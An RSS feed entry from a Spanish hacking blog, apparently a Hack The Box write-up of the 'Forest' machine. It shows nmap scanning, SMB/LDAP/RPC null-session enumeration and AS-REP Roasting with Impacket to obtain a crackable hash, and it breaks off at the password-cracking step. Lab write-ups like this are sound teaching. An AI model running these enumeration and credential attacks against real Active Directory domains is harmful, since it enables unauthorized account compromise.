<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Filthy Hacker</title>
    <description>Filthy Hacker es un blog dedicado al hacking. ¿Te apasiona la ciberseguridad, o quieres aprender? ¡Este es el lugar! Resolución de máquinas, explicación de vulnerabilidades, CTF&apos;s y varias temáticas relacionadas al hacking.</description>
    <link></link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <author>
      <name>MateoNitro550</name>
      <email></email>
      <uri>https://mateonitro550.github.io</uri>
    </author>
    
    
    
    
    
      <item>
        <title>Forest - Hack The Box</title>
        <description>&lt;p&gt;El día de hoy vamos a resolver la máquina &lt;em&gt;Forest&lt;/em&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;. Es una máquina &lt;em&gt;Windows&lt;/em&gt; de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/1.png&quot; alt=&quot;User Rated Difficulty&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;

&lt;p&gt;Primeramente vamos a lanzar una &lt;em&gt;traza ICMP&lt;/em&gt; para saber si la máquina está activa.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del &lt;em&gt;TTL&lt;/em&gt;; en este caso el valor del &lt;em&gt;TTL&lt;/em&gt; de la máquina es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt;, por lo que podemos intuir que estamos ante una máquina &lt;em&gt;Windows&lt;/em&gt;. Recordemos que algunos de los valores referenciales son los siguientes:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Sistema Operativo (OS)&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;TTL&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;128&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solaris&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;254&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.161 -R
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3a.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Posteriormente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49957 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Basándonos en la información que nos reporta &lt;em&gt;Nmap&lt;/em&gt;, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS&lt;/code&gt; (53), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos authentication&lt;/code&gt; (88), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt; (135), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetBIOS&lt;/code&gt; (139), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; (389), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; (445) y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt; (5985). Por lo que podemos intuir nos estamos enfrentando ante un &lt;em&gt;Domain Controller (DC)&lt;/em&gt; y nos encontramos en un entorno de &lt;em&gt;Active Directory (AD)&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;

&lt;p&gt;Lo primero que haremos será comprobar si la máquina cuenta con recursos compartidos a nivel de red a través del uso de un &lt;em&gt;null session&lt;/em&gt;, pues no contamos con credenciales; para ello podemos hacer uso de herramientas como &lt;em&gt;SMBMap&lt;/em&gt; o &lt;em&gt;smbclient&lt;/em&gt;, no obstante, no podremos listar nada.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente que podemos probar es enumerar el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; para obtener información sobre usuarios, grupos u otros objetos en el entorno. Para realizar esto, utilizaremos la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Nuestro primer objetivo será identificar el &lt;em&gt;Naming Context&lt;/em&gt;, que es el &lt;em&gt;Distinguished Name (DN)&lt;/em&gt; que representa el nivel más alto en la jerarquía del &lt;em&gt;Directory Information Tree (DIT)&lt;/em&gt; y servirá como base para nuestras consultas. Utilizaremos el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; base namingcontexts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El campo &lt;em&gt;dn&lt;/em&gt; se encuentra vacío porque estamos consultando el objeto base del directorio. Los campos &lt;em&gt;namingContexts&lt;/em&gt; listan los diferentes &lt;em&gt;Naming Contexts&lt;/em&gt; del servidor &lt;em&gt;LDAP&lt;/em&gt;. Cada entrada en &lt;em&gt;namingContexts&lt;/em&gt; representa una parte distinta del directorio &lt;em&gt;LDAP&lt;/em&gt; que puede ser la base de varias búsquedas.&lt;/p&gt;

&lt;p&gt;Utilizaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DC=htb,DC=local&lt;/code&gt; como base de nuestras consultas porque este es el &lt;em&gt;Naming Context&lt;/em&gt; principal que representa el dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;htb.local&lt;/code&gt;, incluyendo usuarios, grupos y otros objetos principales. Los demás &lt;em&gt;Naming Contexts&lt;/em&gt; (CN=Configuration, CN=Schema, DC=DomainDnsZones, DC=ForestDnsZones) son específicos para configuraciones y esquemas dentro del entorno de &lt;em&gt;AD&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Una vez obtenemos el &lt;em&gt;DN&lt;/em&gt;, podemos empezar a realizar consultas específicas o bien, podríamos listar toda la información del &lt;em&gt;LDAP&lt;/em&gt; con el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dc=htb,dc=local&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-x&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Simple authentication&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-h&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Host&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-s&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Search scope&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-b&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;DN base para la búsqueda&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Podemos comenzar buscando entradas que contengan la clase de objeto &lt;em&gt;user&lt;/em&gt; para listar usuarios del sistema.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dc=htb,dc=local&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(objectClass=user)&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En los campos &lt;em&gt;sAMAccountName&lt;/em&gt; de cada usuario, encontraremos sus respectivos nombres de usuario. Con un listado potencial de usuarios en nuestro poder, podríamos considerar un ataque &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;El ataque &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt; explota una debilidad en la autenticación de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos&lt;/code&gt; en entornos de &lt;em&gt;Active Directory&lt;/em&gt;. Este ataque comienza enviando un mensaje de solicitud de &lt;em&gt;Authentication Server Request (AS-REQ)&lt;/em&gt; al &lt;em&gt;DC&lt;/em&gt; para usuarios que están configurados para no requierer preautenticación de &lt;em&gt;Kerberos&lt;/em&gt;. Si la cuenta del usuario está configurada de esta manera, el &lt;em&gt;DC&lt;/em&gt; nos responderá con un mensaje de &lt;em&gt;Authentication Server Response (AS-REP)&lt;/em&gt;, que contiene un &lt;em&gt;Ticket Granting Ticket (TGT)&lt;/em&gt; emitido por el &lt;em&gt;Key Distribution Center (KDC)&lt;/em&gt;. Este &lt;em&gt;TGT&lt;/em&gt; puede ser vulnerable a ataques de fuerza bruta si la contraseña es débil, permitiéndonos romper la contraseña del usuario sin tener que realizar una autenticación completa. Esta vulnerabilidad se explota debido a que el servidor responde con un mensaje &lt;em&gt;AS-REP&lt;/em&gt; en lugar de rechazar la solicitud debido a la falta de preautenticación.&lt;/p&gt;

&lt;p&gt;Con esto en mente, en vez de buscar usuario por usuario manualmente, podemos utilizar un one-liner para filtrar y parsear los usuarios directamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos refinar aún más la lista de usuarios obtenida para centrarnos exclusivamente en las cuentas relevantes. Las dos primeras cuentas, &lt;em&gt;DefaultAccount&lt;/em&gt; y &lt;em&gt;Guest&lt;/em&gt;, son creadas por el propio &lt;em&gt;AD&lt;/em&gt; (aunque &lt;em&gt;Guest&lt;/em&gt; no está habilitada por defecto). Las cuentas que terminan en &lt;em&gt;$&lt;/em&gt; son cuentas de equipos (&lt;em&gt;computer accounts&lt;/em&gt;), mientras que la cuenta &lt;em&gt;$331000-VK4ADACQNUCA&lt;/em&gt; tiene un formato inusual y podría ser una cuenta de servicio especial o generada automáticamente. Las cuentas que empiezan por &lt;em&gt;SM_&lt;/em&gt; y &lt;em&gt;HealthMailbox&lt;/em&gt; están relacionadas con el servicio &lt;em&gt;Microsoft Exchange&lt;/em&gt;. Esto nos deja con cinco usuarios potenciales para nuestro análisis.&lt;/p&gt;

&lt;p&gt;Lo siguiente que haremos será utilizar el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetNPUsers&lt;/code&gt; de la suite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt;. Para ejecutarlo, necesitamos proporcionar el nombre del dominio del &lt;em&gt;AD&lt;/em&gt; al que queremos apuntar. Para configurar esto, editaremos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; para asegurarnos de que el nombre de dominio se resuelva a la dirección IP correspondiente del servidor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Con esto hecho, el comando que utilizaremos es el siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-GetNPUsers htb.local/ &lt;span class=&quot;nt&quot;&gt;-no-pass&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-userfile&lt;/span&gt; archivoListadoUsuarios 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Curiosamente, ninguno de los usuarios que hemos obtenido parece ser vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt;. Por lo tanto, procederemos a enumerar otro protocolo que hemos identificado durante nuestro escaneo con &lt;em&gt;Nmap&lt;/em&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt;, nuevamente utilizando un &lt;em&gt;null session&lt;/em&gt;, pues no contamos con credenciales. Verificamos que podemos conectarnos exitosamente, por lo que procederemos a enumerar información adicional. Podríamos listar los grupos dentro del dominio mediante &lt;em&gt;enumdomgroup&lt;/em&gt; o, alternativamente, volver a listar los usuarios del dominio mediante &lt;em&gt;enumdomusers&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar tres nuevos usuarios que no habíamos detectado cuando enumeramos con &lt;em&gt;ldapsearch&lt;/em&gt;. De los cuales nos interesa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt;, pues tanto Administrator como krbtgt son creados por el propio &lt;em&gt;AD&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Si recordamos, cuando utilizamos &lt;em&gt;ldapsearch&lt;/em&gt;, filtramos usuarios cuya clase de objeto contenga &lt;em&gt;user&lt;/em&gt;, y los cinco usuarios que encontramos anteriormente, cumplen con esta condición.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sin embargo, al investigar un poco más, descubrimos que este “usuario” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; no tiene una clase de objeto definida. Esto probablemente se debe a que pertenece a la &lt;em&gt;Unidad Organizativa (OU)&lt;/em&gt; de Cuentas de Servicio (Service Accounts).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nuevamente, mediante el uso de un one-liner podríamos filtrar y parsear los usuarios, refinar la lista y utilizarla junto a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt; para comprobar si este nuevo usuario es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Descubrimos que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt; y obtenemos un hash que procederemos a intentar romper por fuerza bruta utilizando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John the Ripper&lt;/code&gt; en conjunto con el diccionario &lt;a href=&quot;https://github.com/brannondorsey/naive-hashcat/releases/tag/data&quot;&gt;rockyou.txt&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;En caso de no contar con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John the Ripper&lt;/code&gt; instalada, podemos hacer lo siguiente:&lt;/p&gt;

